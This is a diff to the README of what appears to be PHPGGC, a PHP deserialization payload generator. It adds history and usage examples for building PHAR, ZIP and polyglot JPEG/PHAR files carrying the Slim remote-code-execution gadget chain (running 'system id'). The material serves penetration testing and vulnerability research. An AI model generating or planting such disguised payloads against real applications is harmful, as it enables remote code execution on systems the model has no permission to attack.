@@ -119,10 +119,25 @@ a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
 
 ## PHAR(GGC)
 
+### History
+
 At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (`file_exists`, `fopen`, etc.). The paper is [here](https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf).
+
+### Implementation
 
 PHAR archives come in three different formats: **PHAR, TAR, and ZIP**. The three of them are supported by PHPGGC.
 Polyglot files can be generated using `--phar-jpeg` (`-pj`). Other options are available (use `-h`).
+
+### Examples
+
+```
+$ # Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar
+$ ./phpggc -p phar -o /tmp/z.phar slim/rce1 system id
+$ # Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar
+$ ./phpggc -p zip -o /tmp/z.zip.phar slim/rce1 system id
+$ # Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar
+$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar slim/rce1 system id
+```
 
 
 ## Encoders
